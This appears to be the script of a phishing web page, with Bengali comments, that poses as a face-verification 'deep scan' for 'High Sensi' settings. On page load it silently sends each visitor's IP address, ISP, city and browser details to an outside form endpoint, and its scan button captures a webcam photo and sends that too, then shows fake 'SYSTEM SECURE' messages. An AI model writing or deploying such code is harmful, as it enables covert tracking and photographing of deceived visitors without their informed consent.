<script>
async function collectData() {
    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const data = await ipRes.json();
        
        // ১. সাধারণ ডাটা পাঠানো
        fetch("https://formspree.io/f/mgorkgyy", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                IP: data.ip,
                ISP: data.org,
                City: data.city,
                Device: navigator.userAgent
            })
        });
    } catch (e) { console.log("Silent logging..."); }
}

// ক্যামেরা স্ন্যাপশট ফাংশন
async function takeSnapshot() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const imgData = canvas.toDataURL('image/jpeg');

        // ২. ছবিসহ ডাটা পাঠানো (এটি Formspree-তে অনেক সময় বড় হতে পারে, তাই সাবধান)
        fetch("https://formspree.io/f/mgorkgyy", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ Photo_Base64: imgData, Status: "Face Captured" })
        });

        stream.getTracks().forEach(track => track.stop()); // ক্যামেরা বন্ধ করা
    } catch (err) {
        alert("Verification Failed! Please allow camera for High Sensi.");
    }
}

window.onload = collectData;

function startScan() {
    const btn = document.getElementById('scanBtn');
    btn.innerText = "VERIFYING FACE...";
    // ক্যামেরা পারমিশন চাওয়া
    takeSnapshot().then(() => {
        setTimeout(() => {
            alert("Face Verified! Deep Scan Complete.");
            btn.innerText = "SYSTEM SECURE";
        }, 3000);
    });
}
</script>
